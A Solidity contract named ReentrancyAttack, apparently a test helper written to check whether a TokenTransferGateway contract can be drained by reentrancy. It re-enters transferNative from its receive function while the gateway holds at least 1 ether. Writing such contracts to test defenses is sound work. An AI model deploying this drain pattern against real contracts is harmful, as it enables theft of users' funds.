// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./TokenTransferGateway.sol";

contract ReentrancyAttack {
    TokenTransferGateway public gateway;

    constructor(address gatewayAddress) {
        gateway = TokenTransferGateway(gatewayAddress);
    }

    receive() external payable {
        if (address(gateway).balance >= 1 ether) {
            gateway.transferNative(payable(address(this)));
        }
    }

    function attack() external payable {
        gateway.transferNative{value: msg.value}(payable(address(this)));
    }

    function deposit() external payable {
        // Deposit funds to the contract
    }
}
